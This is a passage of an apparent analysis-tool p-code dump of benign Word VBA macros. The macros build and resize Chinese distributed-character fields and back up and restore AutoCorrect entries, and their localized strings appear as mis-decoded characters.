' 	Ld wdCursorWait 
' 	Ld System 
' 	MemSt Cursor 
' Line #2640:
' Line #2641:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #2642:
' 	SetStmt 
' 	MemLdWith Range 
' 	Set rgnOrg 
' Line #2643:
' 	StartForVariable 
' 	Ld para 
' 	EndForVariable 
' 	Ld rgnOrg 
' 	MemLd Paragraphs 
' 	ForEach 
' Line #2644:
' 	LitDI2 0x0001 
' 	Ld rgnOrg 
' 	MemLd Then 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #2645:
' 	SetStmt 
' 	Ld para 
' 	MemLd Range 
' 	Set rgn 
' Line #2646:
' 	Ld para 
' 	MemLd Range 
' 	MemLd Start 
' 	Ld rgnOrg 
' 	MemLd Start 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #2647:
' 	Ld rgnOrg 
' 	MemLd Start 
' 	Ld rgn 
' 	MemLd End 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld rgn 
' 	ArgsMemCall SetRange 0x0002 
' Line #2648:
' 	Ld para 
' 	MemLd Range 
' 	MemLd End 
' 	Ld rgnOrg 
' 	MemLd End 
' 	Gt 
' 	Paren 
' 	ElseIfBlock 
' Line #2649:
' 	Ld rgn 
' 	MemLd Start 
' 	Ld rgnOrg 
' 	MemLd End 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld rgn 
' 	ArgsMemCall SetRange 0x0002 
' Line #2650:
' 	ElseBlock 
' Line #2651:
' 	Ld rgn 
' 	MemLd Start 
' 	Ld rgn 
' 	MemLd End 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld rgn 
' 	ArgsMemCall SetRange 0x0002 
' Line #2652:
' 	EndIfBlock 
' Line #2653:
' 	Ld rgn 
' 	ArgsMemCall Set 0x0000 
' Line #2654:
' 	ElseBlock 
' Line #2655:
' 	SetStmt 
' 	Ld rgnOrg 
' 	Set rgn 
' Line #2656:
' 	EndIfBlock 
' Line #2657:
' 	LitDI2 0x0001 
' 	Ld rgn 
' 	MemLd Then 
' 	LitDI2 0x000B 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr3 
' 	St cLineBreak 
' Line #2658:
' 	Ld cLineBreak 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #2659:
' 	Ld rgn 
' 	MemLd Start 
' 	Ld rgn 
' 	MemLd Start 
' 	Ld cLineBreak 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld rgn 
' 	ArgsMemCall SetRange 0x0002 
' Line #2660:
' 	Ld rgn 
' 	ArgsMemCall Set 0x0000 
' Line #2661:
' 	EndIfBlock 
' Line #2662:
' 	MemLdWith Fields 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #2663:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Fields 0x0001 
' 	MemLd Code 
' 	St a$ 
' Line #2664:
' 	Ld a$ 
' 	ArgsLd FIsDistField 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #2665:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Fields 0x0001 
' 	Ld n 
' 	ArgsCall Resize 0x0002 
' Line #2666:
' 	GoTo LContinue 
' Line #2667:
' 	EndIfBlock 
' Line #2668:
' 	EndIfBlock 
' Line #2669:
' Line #2670:
' 	MemLdWith Then 
' 	FnLen 
' 	St c 
' Line #2671:
' 	QuoteRem 0x000C 0x0019 " Remove Additional Spaces"
' Line #2672:
' 	MemLdWith Then 
' 	St sz$ 
' Line #2673:
' 	LitDI2 0x0000 
' 	St x 
' Line #2674:
' 	Ld sz$ 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	ArgsLd FIsSpace 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	While 
' Line #2675:
' 	Ld sz$ 
' 	Ld sz$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St sz$ 
' Line #2676:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #2677:
' 	Wend 
' Line #2678:
' Line #2679:
' 	QuoteRem 0x000C 0x0016 " Create DistChar field"
' Line #2680:
' 	QuoteRem 0x000C 0x0016 " {eq \o\ad(foo,     )}"
' Line #2681:
' 	SetStmt 
' 	MemLdWith Range 
' 	Set rgn 
' Line #2682:
' 	Ld x 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #2683:
' 	ArgsMemCallWith MoveRight 0x0000 
' Line #2684:
' 	Ld wdCharacter 
' 	ParamNamed unit 
' 	Ld x 
' 	ParamNamed Count 
' 	ArgsMemCallWith MoveLeft 0x0002 
' Line #2685:
' 	Ld wdCharacter 
' 	ParamNamed unit 
' 	Ld x 
' 	ParamNamed Count 
' 	ArgsMemCallWith Delete 0x0002 
' Line #2686:
' 	Ld rgn 
' 	ArgsMemCall Set 0x0000 
' Line #2687:
' 	EndIfBlock 
' Line #2688:
' 	LitStr 0x0001 ","
' 	Ld n 
' 	LitStr 0x0002 "¡@"
' 	ArgsLd String$$ 0x0002 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	ArgsMemCallWith InsertAfter 0x0001 
' Line #2689:
' 	LitStr 0x0009 "eq \o\ad("
' 	ArgsMemCallWith InsertBefore 0x0001 
' Line #2690:
' 	Ld rgn 
' 	MemLd Start 
' 	LitStr 0x0009 "eq \o\ad("
' 	FnLen 
' 	Add 
' 	Ld rgn 
' 	MemLd End 
' 	Ld rgn 
' 	ArgsMemCall SetRange 0x0002 
' Line #2691:
' 	LitVarSpecial (False)
' 	Ld rgn 
' 	MemLd Font 
' 	MemSt DisableCharacterSpaceGrid 
' Line #2692:
' 	SetStmt 
' 	MemLdWith Range 
' 	Set rgn 
' Line #2693:
' 	QuoteRem 0x000B 0x000D " Insert Field"
' Line #2694:
' 	MemLdWith Range 
' 	ParamOmitted 
' 	ParamOmitted 
' 	LitVarSpecial (False)
' 	MemLdWith Fields 
' 	ArgsMemCall Add 0x0004 
' Line #2695:
' 	QuoteRem 0x000C 0x0018 " { eq \o\ad(foo,     ) }"
' Line #2696:
' 	QuoteRem 0x000C 0x0028 "                      ~ Remove tip space"
' Line #2697:
' 	Ld rgn 
' 	ArgsMemCall Set 0x0000 
' Line #2698:
' 	MemLdWith Range 
' 	MemLd End 
' 	LitDI2 0x0002 
' 	Sub 
' 	MemLdWith Range 
' 	MemLd End 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld rgn 
' 	ArgsMemCall SetRange 0x0002 
' Line #2699:
' 	LitStr 0x0000 ""
' 	Ld rgn 
' 	MemSt Then 
' Line #2700:
' Line #2701:
' 	MemLdWith Fields 
' 	ArgsMemCall ToggleShowCodes 0x0000 
' Line #2702:
' 	ParamOmitted 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemCallWith MoveRight 0x0003 
' Line #2703:
' 	Label LContinue 
' Line #2704:
' 	StartForVariable 
' 	Ld para 
' 	EndForVariable 
' 	NextVar 
' Line #2705:
' 	EndWith 
' Line #2706:
' 	Ld rgnOrg 
' 	ArgsMemCall Set 0x0000 
' Line #2707:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #2708:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #2709:
' 	ExitSub 
' Line #2710:
' 	Label LError 
' Line #2711:
' 	Ld Err 
' 	MemLd Description 
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #2712:
' 	EndSub 
' Line #2713:
' Line #2714:
' 	QuoteRem 0x0000 0x0026 " *************************************"
' Line #2715:
' 	FuncDefn (Function FIsSpace(wh, id_FFFE As Variant))
' Line #2716:
' 	Ld wh$ 
' 	ArgsLd AscW 0x0001 
' 	St ch 
' Line #2717:
' 	QuoteRem 0x0004 0x0029 " Space DBSpace EmSpace EnSpace 1/4EmSpace"
' Line #2718:
' 	Ld ch 
' 	LitDI2 0x0020 
' 	Eq 
' 	Ld ch 
' 	LitDI2 0x3000 
' 	Eq 
' 	Or 
' 	Ld ch 
' 	LitDI2 0x2005 
' 	Eq 
' 	Or 
' 	Ld ch 
' 	LitDI2 0x2002 
' 	Eq 
' 	Or 
' 	Ld ch 
' 	LitDI2 0x2003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #2719:
' 	Ld ch 
' 	St FIsSpace 
' Line #2720:
' 	ElseBlock 
' Line #2721:
' 	LitDI2 0x0000 
' 	St FIsSpace 
' Line #2722:
' 	EndIfBlock 
' Line #2723:
' 	EndFunc 
' Line #2724:
' Line #2725:
' Line #2726:
' 	FuncDefn (Sub Delete())
' Line #2727:
' 	Dim 
' 	VarDefn rgn (As Range)
' Line #2728:
' 	Dim 
' 	VarDefn rgnFld (As Range)
' Line #2729:
' 	Dim 
' 	VarDefn rgnNew (As Range)
' Line #2730:
' 	Dim 
' 	VarDefn fld (As Field)
' Line #2731:
' 	Dim 
' 	VarDefn FUpdate (As Boolean)
' Line #2732:
' Line #2733:
' 	OnError LError 
' Line #2734:
' 	Ld Application 
' 	MemLd ScreenUpdating 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #2735:
' 	LitVarSpecial (True)
' 	St FUpdate 
' Line #2736:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #2737:
' 	Ld wdCursorWait 
' 	Ld System 
' 	MemSt Cursor 
' Line #2738:
' 	ElseBlock 
' Line #2739:
' 	LitVarSpecial (False)
' 	St FUpdate 
' Line #2740:
' 	EndIfBlock 
' Line #2741:
' Line #2742:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #2743:
' 	SetStmt 
' 	MemLdWith Range 
' 	Set rgn 
' Line #2744:
' Line #2745:
' 	MemLdWith Fields 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #2746:
' 	QuoteRem 0x0000 0x0023 "            Create (Len(.Text) + 1)"
' Line #2747:
' 	ArgsCall Beep 0x0000 
' Line #2748:
' 	GoTo LExit 
' 	BoS 0x0000 
' Line #2749:
' 	EndIfBlock 
' Line #2750:
' 	StartForVariable 
' 	Ld fld 
' 	EndForVariable 
' 	Ld rgn 
' 	MemLd Fields 
' 	ForEach 
' Line #2751:
' 	Ld fld 
' 	MemLd Code 
' 	St a$ 
' Line #2752:
' 	SetStmt 
' 	Ld fld 
' 	MemLd Code 
' 	Set rgnFld 
' Line #2753:
' 	Ld rgnFld 
' 	MemLd Then 
' 	ArgsLd FIsDistField 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #2754:
' 	GoTo LContinue 
' 	BoS 0x0000 
' Line #2755:
' 	EndIfBlock 
' Line #2756:
' 	Ld rgnFld 
' 	ArgsMemCall Set 0x0000 
' Line #2757:
' Line #2758:
' 	LitDI2 0x0001 
' 	Ld a$ 
' 	LitStr 0x0001 "("
' 	FnInStr3 
' 	Ld rgnFld 
' 	MemLd Start 
' 	Add 
' 	St iTop 
' Line #2759:
' 	Ld rgnFld 
' 	MemLd End 
' 	Ld rgnFld 
' 	MemLd Then 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld a$ 
' 	LitStr 0x0003 ",¡@"
' 	FnInStr3 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Sub 
' 	St iEnd 
' Line #2760:
' 	Ld iTop 
' 	Ld iEnd 
' 	Ld rgnFld 
' 	ArgsMemCall SetRange 0x0002 
' Line #2761:
' Line #2762:
' 	ArgsMemCallWith MoveLeft 0x0000 
' Line #2763:
' 	SetStmt 
' 	Ld Selection 
' 	MemLd Range 
' 	Set rgnNew 
' Line #2764:
' 	Ld rgnFld 
' 	MemLd FormattedText 
' 	Ld rgnNew 
' 	MemSt FormattedText 
' Line #2765:
' 	LitVarSpecial (True)
' 	Ld rgnNew 
' 	MemLd Font 
' 	MemSt DisableCharacterSpaceGrid 
' Line #2766:
' 	Ld rgnNew 
' 	ArgsMemCall Set 0x0000 
' Line #2767:
' 	ArgsMemCallWith MoveRight 0x0000 
' Line #2768:
' 	ParamOmitted 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemCallWith MoveRight 0x0003 
' Line #2769:
' 	ArgsMemCallWith Delete 0x0000 
' Line #2770:
' 	Label LContinue 
' Line #2771:
' 	StartForVariable 
' 	Ld fld 
' 	EndForVariable 
' 	NextVar 
' Line #2772:
' 	Ld rgn 
' 	ArgsMemCall Set 0x0000 
' Line #2773:
' 	EndWith 
' Line #2774:
' 	Label LExit 
' Line #2775:
' 	Ld FUpdate 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #2776:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #2777:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #2778:
' 	EndIfBlock 
' Line #2779:
' 	ExitSub 
' Line #2780:
' 	Label LError 
' Line #2781:
' 	Ld Err 
' 	MemLd Description 
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #2782:
' 	EndSub 
' Line #2783:
' Line #2784:
' Line #2785:
' 	FuncDefn (Sub Resize(fld As , iNew As Integer))
' Line #2786:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #2787:
' 	Ld wdCursorWait 
' 	Ld System 
' 	MemSt Cursor 
' Line #2788:
' 	OnError LError 
' Line #2789:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #2790:
' 	Dim 
' 	VarDefn rgn (As Range)
' Line #2791:
' 	Ld fld 
' 	MemLd Code 
' 	St a$ 
' Line #2792:
' 	SetStmt 
' 	Ld fld 
' 	MemLd Code 
' 	Set rgn 
' Line #2793:
' Line #2794:
' 	Ld rgn 
' 	MemLd End 
' 	Ld a$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld a$ 
' 	LitStr 0x0003 ",¡@"
' 	FnInStr3 
' 	Sub 
' 	Paren 
' 	Sub 
' 	St iTop 
' Line #2795:
' 	Ld rgn 
' 	MemLd End 
' 	Ld a$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld a$ 
' 	LitStr 0x0001 ")"
' 	FnInStr3 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Sub 
' 	St iEnd 
' Line #2796:
' 	Ld iTop 
' 	Ld iEnd 
' 	Ld rgn 
' 	ArgsMemCall SetRange 0x0002 
' Line #2797:
' 	Ld iNew 
' 	LitStr 0x0002 "¡@"
' 	ArgsLd String$$ 0x0002 
' 	Ld rgn 
' 	MemSt Then 
' Line #2798:
' 	EndWith 
' Line #2799:
' 	Label LExit 
' Line #2800:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #2801:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #2802:
' 	ExitSub 
' Line #2803:
' 	Label LError 
' Line #2804:
' 	Ld Err 
' 	MemLd Description 
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #2805:
' 	EndSub 
' Line #2806:
' Line #2807:
' Line #2808:
' 	FuncDefn (Function FIsDistField(szFld As String, id_FFFE As Boolean) As Boolean)
' Line #2809:
' 	LitVarSpecial (False)
' 	St FIsDistField 
' Line #2810:
' 	QuoteRem 0x0004 0x0018 " { eq \o\ad(foo,¡@¡@¡@)}"
' Line #2811:
' 	QuoteRem 0x0004 0x0017 "   ~~~~~~~~~        ~~~"
' Line #2812:
' 	Ld szFld 
' 	LitDI2 0x000A 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x000A " eq \o\ad("
' 	Eq 
' 	Paren 
' 	Ld szFld 
' 	LitDI2 0x0002 
' 	ArgsLd Right$ 0x0002 
' 	LitStr 0x0003 "¡@)"
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #2813:
' 	LitVarSpecial (True)
' 	St FIsDistField 
' Line #2814:
' 	EndIfBlock 
' Line #2815:
' 	EndFunc 
' Line #2816:
' Line #2817:
' Line #2818:
' Line #2819:
' Line #2820:
' Line #2821:
' Macros/VBA/UF01 - 15394 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' 	Option  (Explicit)
' Line #8:
' Line #9:
' 	QuoteRem 0x0000 0x0014 " START LOCALIZATION'"
' Line #10:
' 	Dim (Const) 
' 	LitStr 0x0013 "¥[¤J¦Û°Ê®Õ¥¿¶µ¥Ø¡G "
' 	VarDefn StatMsg1
' Line #11:
' 	Dim (Const) 
' 	LitStr 0x0004 " ¤§ "
' 	VarDefn StatMsg2
' Line #12:
' 	Dim (Const) 
' 	LitStr 0x000F "¥¿¦b«Ø¥ß¼Ë¦¡..."
' 	VarDefn StatMsg3
' Line #13:
' 	Dim (Const) 
' 	LitStr 0x000B "¥¿¦bÀx¦s..."
' 	VarDefn StatMsg4
' Line #14:
' 	Dim (Const) 
' 	LitStr 0x0014 "¦Û°Ê®Õ¥¿¶µ¥Ø³Æ¥÷¤å¥ó"
' 	VarDefn TagText
' Line #15:
' 	Dim (Const) 
' 	LitStr 0x000E "¦Û°Ê®Õ¥¿¤u¨ã¶°"
' 	VarDefn szAppName
' Line #16:
' 	Dim (Const) 
' 	LitStr 0x001C "¦³¿ù»~µo¥Í¡C±z­n¦A¸Õ¤@¦¸¶Ü¡H"
' 	VarDefn szErrorMsg
' Line #17:
' 	Dim (Const) 
' 	LitStr 0x0023 "¦³¿ù»~µo¥Í¡C ¤å¥óªº¼Ë¦¡¥i¯à¦³°ÝÃD¡C"
' 	VarDefn szACEntriesErrorMsg
' Line #18:
' 	Dim (Const) 
' 	LitStr 0x0066 "µ{¦¡±N±q³Æ¥÷¤å¥ó¤¤¨ú¥XÀx¦sªº¦Û°Ê®Õ¥¿¶µ¥Ø¡A¥Ø«e¦Û°Ê®Õ¥¿¶µ¥Ø¤¤¬Û¦P¦WºÙªº³¡¥÷±N·|³Q¨ú¥N±¼¡C±zÁÙ­nÄ~Äò¶Ü¡H"
' 	VarDefn szWarnMsg
' Line #19:
' 	Dim (Const) 
' 	LitStr 0x0024 "³o¥÷¤å¥óªº¼Ë¦¡¤£¬O¥¿½Tªº³Æ¥÷¤å¥ó¼Ë¦¡"
' 	VarDefn szFormatIncorrect
' Line #20:
' 	Dim (Const) 
' 	LitStr 0x0010 "¤w§¹¦¨­«·s¸ü¤J¡C"
' 	VarDefn szRestoreCompletemsg
' Line #21:
' 	QuoteRem 0x0000 0x0012 " END LOCALIZATION'"
' Line #22:
' Line #23:
' 	QuoteRem 0x0000 0x0032 "***********   btnBackup_Click() ******************"
' Line #24:
' 	QuoteRem 0x0000 0x0000 ""
' Line #25:
' 	QuoteRem 0x0000 0x004C " Hides the form, creates a new Word document, calls GetAutoCorrectEntries(),"
' Line #26:
' 	QuoteRem 0x0000 0x0048 " adds the text "AutoCorrect Backup Document" at the top of the document,"
' Line #27:
' 	QuoteRem 0x0000 0x002D " and saves the document by calling SaveACDoc."
' Line #28:
' 	QuoteRem 0x0000 0x0000 ""
' Line #29:
' 	QuoteRem 0x0000 0x002A " Uses valuable y that doesn't do anything."
' Line #30:
' Line #31:
' 	FuncDefn (Private Sub btnBackup_Click())
' Line #32:
' 	Dim 
' 	VarDefn Y (As Integer)
' Line #33:
' Line #34:
' 	Ld Autocorrect 
' 	ArgsMemCall Hide 0x0000 
' Line #35:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #36:
' Line #37:
' 	QuoteRem 0x0000 0x0013 "create new document"
' Line #38:
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0000 
' Line #39:
' Line #40:
' 	QuoteRem 0x0001 0x002A " call GetAutoCorrectEntries() user defined"
' Line #41:
' 	ArgsLd GetAutoCorrectEntries 0x0000 
' 	St Y 
' Line #42:
' Line #43:
' 	QuoteRem 0x0000 0x001C " add Text to top of document"
' Line #44:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #45:
' 	ArgsMemCallWith SplitTable 0x0000 
' Line #46:
' 	Ld TagText 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #47:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #48:
' 	EndWith 
' Line #49:
' Line #50:
' 	QuoteRem 0x0000 0x0013 "add some formatting"
' Line #51:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Sentences 0x0001 
' 	With 
' Line #52:
' 	LitVarSpecial (True)
' 	MemStWith Bold 
' Line #53:
' 	LitDI2 0x000E 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #54:
' 	EndWith 
' Line #55:
' Line #56:
' 	QuoteRem 0x0000 0x0045 " Save the Document,call SaveACDoc() user defined, close if successful"
' Line #57:
' 	Ld StatMsg4 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #58:
' 	Ld SaveACDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #59:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #62:
' 	Ld Autocorrect 
' 	ArgsMemCall Show 0x0000 
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Private Sub btnClose_Click())
' Line #66:
' 	Ld Autocorrect 
' 	ArgsMemCall Hide 0x0000 
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' 	QuoteRem 0x0000 0x002F "************* btnRestore_Click() **************"
' Line #70:
' 	QuoteRem 0x0000 0x0000 ""
' Line #71:
' 	QuoteRem 0x0000 0x0044 " First warns the user that this will replace their existing entries."
' Line #72:
' 	QuoteRem 0x0000 0x0046 " If they answer no it jumps to the end of the function.  Then displays"
' Line #73:
' 	QuoteRem 0x0000 0x004A " the FileOpen dialog box to get the name of an existing AutoCorrect backup"
' Line #74:
' 	QuoteRem 0x0000 0x004D " document (creating using the Backup button.)  Next calls OpenACDoc() to open"
' Line #75:
' 	QuoteRem 0x0000 0x0056 " the file. If successful it calls RestoreACEntries(). Finally, it closes the document."
' Line #76:
' 	QuoteRem 0x0000 0x0000 ""
' Line #77:
' 	QuoteRem 0x0000 0x0000 ""
' Line #78:
' 	QuoteRem 0x0000 0x0000 ""
' Line #79:
' 	FuncDefn (Private Sub btnRestore_Click())
' Line #80:
' 	Dim 
' 	VarDefn ACFileName
' 	VarDefn Title (As String)
' Line #81:
' 	Dim 
' 	VarDefn Style
' 	VarDefn Response
' 	VarDefn x (As Integer)
' Line #82:
' Line #83:
' 	Ld Autocorrect 
' 	ArgsMemCall Hide 0x0000 
' Line #84:
' Line #85:
' 	QuoteRem 0x0000 0x0025 " warn users about replaced entries..."
' Line #86:
' 	Ld vbYesNo 
' 	Ld vbInformation 
' 	Add 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St Style 
' 	QuoteRem 0x0033 0x0010 " Define buttons."
' Line #87:
' 	Ld szAppName 
' 	St Title 
' Line #88:
' 	Ld szWarnMsg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #89:
' 	Ld Response 
' 	Ld vbNo 
' 	Eq 
' 	IfBlock 
' Line #90:
' 	QuoteRem 0x0003 0x0004 "exit"
' Line #91:
' 	GoTo bye 
' 	BoS 0x0000 
' Line #92:
' 	EndIfBlock 
' Line #93:
' Line #94:
' 	QuoteRem 0x0000 0x0021 " bring up fileopen and get a name"
' Line #95:
' 	StartWithExpr 
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #96:
' 	ArgsMemCallWith Display 0x0000 
' Line #97:
' 	MemLdWith New 
' 	St ACFileName 
' Line #98:
' 	EndWith 
' Line #99:
' Line #100:
' 	QuoteRem 0x0000 0x002E " Open a Document,call OpenACDoc() user defined"
' Line #101:
' 	Ld ACFileName 
' 	ArgsLd OpenACDoc 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0025 0x0005 "error"
' Line #102:
' 	QuoteRem 0x0004 0x0036 " Restore Entries, call RestoreACEntries() user defined"
' Line #103:
' 	ArgsLd RestoreACEntries 0x0000 
' 	St x 
' Line #104:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' 	Label bye 
' Line #108:
' 	Ld Autocorrect 
' 	ArgsMemCall Show 0x0000 
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Function RestoreACEntries(id_FFFE As Variant))
' Line #112:
' 	Dim 
' 	VarDefn i
' 	VarDefn NumRows (As Integer)
' Line #113:
' 	Dim 
' 	VarDefn oDoc
' 	VarDefn oACorrect
' 	VarDefn oTable (As Object)
' Line #114:
' Line #115:
' 	Dim 
' 	VarDefn szName (As String)
' Line #116:
' 	Dim 
' 	VarDefn szValue (As String)
' Line #117:
' 	Dim 
' 	VarDefn szRTF (As String)
' Line #118:
' Line #119:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #120:
' 	OnError RestoreACEntriesErrors 
' 	BoS 0x0000 
' Line #121:
' Line #122:
' 	QuoteRem 0x0004 0x0019 " check for correct format"
' Line #123:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	Ld TagText 
' 	Eq 
' 	IfBlock 
' Line #124:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #125:
' Line #126:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set oDoc 
' Line #127:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld oDoc 
' 	ArgsMemLd Tables 0x0001 
' 	Set oTable 
' Line #128:
' 	SetStmt 
' 	Ld Application 
' 	MemLd Autocorrect 
' 	MemLd Entries 
' 	Set oACorrect 
' Line #129:
' Line #130:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Tables 0x0001 
' 	MemLd Rows 
' 	MemLd Count 
' 	St NumRows 
' Line #131:
' 	Ld wdGoToTable 
' 	ParamNamed What 
' 	Ld wdGoToFirst 
' 	ParamNamed Which 
' 	Ld Selection 
' 	ArgsMemCall If 0x0002 
' Line #132:
' 	Ld wdCell 
' 	ParamNamed unit 
' 	LitDI2 0x0003 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0002 
' Line #133:
' Line #134:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld NumRows 
' 	For 
' Line #135:
' 	Ld Selection 
' 	MemLd Then 
' 	St szName 
' Line #136:
' 	Ld wdCell 
' 	ParamNamed unit 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0001 
' Line #137:
' 	Ld Selection 
' 	MemLd Then 
' 	St szValue 
' Line #138:
' 	Ld wdCell 
' 	ParamNamed unit 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0001 
' Line #139:
' 	Ld Selection 
' 	MemLd Then 
' 	St szRTF 
' Line #140:
' 	Ld szRTF 
' 	LitStr 0x0005 "False"
' 	Eq 
' 	IfBlock 
' Line #141:
' 	Ld StatMsg1 
' 	Ld szName 
' 	Concat 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #142:
' 	Ld szName 
' 	ParamNamed New 
' 	Ld szValue 
' 	ParamNamed Value 
' 	Ld oACorrect 
' 	ArgsMemCall Add 0x0002 
' Line #143:
' 	ElseBlock 
' Line #144:
' 	Ld StatMsg1 
' 	Ld szName 
' 	Concat 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #145:
' 	Ld wdCell 
' 	ParamNamed unit 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0001 
' Line #146:
' 	Ld szName 
' 	Ld Selection 
' 	MemLd Range 
' 	Ld oACorrect 
' 	ArgsMemCall AddRichText 0x0002 
' Line #147:
' 	Ld wdCell 
' 	ParamNamed unit 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0001 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	Ld wdCell 
' 	ParamNamed unit 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0001 
' Line #150:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #151:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #152:
' 	Ld szRestoreCompletemsg 
' 	ArgsCall MsgBox 0x0001 
' Line #153:
' 	ElseBlock 
' Line #154:
' 	Ld szFormatIncorrect 
' 	ArgsCall MsgBox 0x0001 
' Line #155:
' 	EndIfBlock 
' Line #156:
' Line #157:
' Line #158:
' 	Label RestoreACEntriesErrors 
' Line #159:
' 	Ld Err 
' 	MemLd Number 
